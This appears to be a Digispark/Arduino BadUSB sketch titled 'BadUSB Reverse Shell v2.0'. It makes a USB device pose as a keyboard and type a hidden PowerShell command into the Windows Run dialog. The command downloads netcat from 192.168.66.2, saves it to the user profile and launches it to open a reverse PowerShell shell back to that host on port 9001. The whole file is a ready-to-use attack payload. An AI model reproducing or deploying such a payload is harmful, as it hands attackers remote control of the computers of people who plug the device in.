#include <DigiKeyboardFi.h>

void setup() {}

void loop() {
	// Description: BadUSB Reverse Shell v2.0
	DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
  DigiKeyboardFi.print("powershell -w hidden -c \"Invoke-WebRequest -OutFile $env:UserProfile/nc64.exe -Uri http://192.168.66.2/nc64.exe ; Start-Process \"$env:UserProfile/nc64.exe\" -ArgumentList \'192.168.66.2\', \'9001\', \'-e\', \'powershell\' -NoNewWindow\"");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  exit(0);
}
